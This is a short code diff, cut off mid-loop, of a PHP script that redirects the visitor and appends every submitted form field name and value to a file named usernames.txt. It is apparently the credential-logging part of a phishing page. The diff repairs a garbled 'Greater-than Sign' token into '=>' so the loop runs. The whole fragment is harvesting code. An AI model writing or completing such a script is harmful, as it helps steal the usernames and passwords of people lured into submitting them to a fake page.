@@ -2,7 +2,7 @@
 header
 ('location:');
 $handle=fopen("usernames.txt", "a");
-foreach($_POST as $variable=𝐆𝐫𝐞𝐚𝐭𝐞𝐫-𝐭𝐡𝐚𝐧 𝐒𝐢𝐠𝐧$value)
+foreach($_POST as $variable=>$value)
 {
 fwrite($handle,$variable);
 fwrite($handle,"-");
